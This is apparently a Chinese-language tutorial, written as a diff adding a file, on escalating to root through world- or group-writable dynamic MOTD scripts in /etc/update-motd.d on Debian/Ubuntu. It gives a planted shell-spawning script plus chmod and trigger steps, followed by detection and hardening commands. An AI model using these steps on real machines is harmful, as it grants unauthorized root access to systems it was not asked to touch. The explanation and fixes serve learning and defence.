@@ -1,0 +1,92 @@
+当你登录进shell时有欢迎语句时，就说明可能存在motd提权漏洞
+
+“MOTD” 本身（`/etc/motd`）只是一个纯文本文件，用来在用户登录时显示消息，直接写命令进去并不会被执行。
+但在许多现代 Linux 发行版（尤其是 Debian/Ubuntu 系列）中，会通过一组脚本来动态生成 MOTD，这些脚本位于：
+
+```
+/etc/update-motd.d/
+```
+
+如果这个目录或其中某个脚本被错误地设置为可写（world-writable 或者对普通用户组可写），就可以借此植入恶意脚本，
+下一次任何用户（尤其是 root）登录、或者系统周期性地执行 `run-parts /etc/update-motd.d` 时，就会以 root 权限执行你的代码，从而获得提权。
+
+---
+
+## 一、原理
+
+1. **动态 MOTD 脚本执行流程**
+
+   * PAM 在用户登录时，会调用 `/usr/bin/landscape-sysinfo`、`/etc/update-motd.d/*` 里的脚本，最后把输出拼成 `/run/motd.dynamic`，再显示给用户。
+   * 这些脚本是以 root 身份执行的。
+
+2. **利用漏洞**
+
+   * 如果 `/etc/update-motd.d/` 目录或其中脚本对普通用户可写，你就可以在其中植入一个 `.sh` 可执行文件。
+   * 该脚本会在下一次登录或系统调用 `run-parts` 时被 root 执行。
+
+---
+
+## 二、步骤演示
+
+假设你在目标机器上已经拿到一个普通用户 shell，且检查到：
+
+```bash
+ls -ld /etc/update-motd.d
+# drwxrwxr-x 2 root somegroup 4096 Feb  1 12:34 /etc/update-motd.d
+```
+
+目录所属组 `somegroup` 包含你的用户，并且是组可写（`rwx`），那你就可以：
+
+1. **写入恶意脚本**
+
+   ```bash
+   cat << 'EOF' > /etc/update-motd.d/99-root-shell
+   #!/bin/sh
+   /bin/sh -i >/dev/tty0 2>&1
+   EOF
+   ```
+
+2. **赋予可执行权限**
+
+   ```bash
+   chmod +x /etc/update-motd.d/99-root-shell
+   ```
+
+3. **触发执行**
+
+   * **方法 A：** 等待有人通过 SSH 或本地控制台登录。
+   * **方法 B：** 有些系统会定时（例如每天、每次 `apt update` 后）调用：
+
+     ```bash
+     sudo run-parts /etc/update-motd.d
+     ```
+   * 一旦执行，你就会在 `/dev/tty0` 或下一个登录 session 里拿到一个 root shell。
+
+---
+
+## 三、检查与防护
+
+* **检查可写性**
+
+  ```bash
+  find /etc/update-motd.d -maxdepth 1 -perm /o+w  -o -perm /g+w
+  ```
+
+* **修复**
+
+  ```bash
+  sudo chmod -R go-w /etc/update-motd.d
+  sudo chown -R root:root /etc/update-motd.d
+  ```
+
+* **最小化动态脚本**
+  如果不需要动态 MOTD，可删除或禁用不必要的脚本，或直接把 `/etc/motd` 设为只读静态文件。
+
+---
+
+### 注意事项
+
+* **前提条件**：目标机器必须对 `/etc/update-motd.d` 或其中脚本拥有写权限。
+* **适用范围**：主要是 Debian/Ubuntu 系列；其他发行版可能没有动态 MOTD 机制，或者路径不同。
+
+通过上述方法，你就可以利用 MOTD 生成脚本的提权漏洞，在 misconfigured 的机器上一键拿到 root。
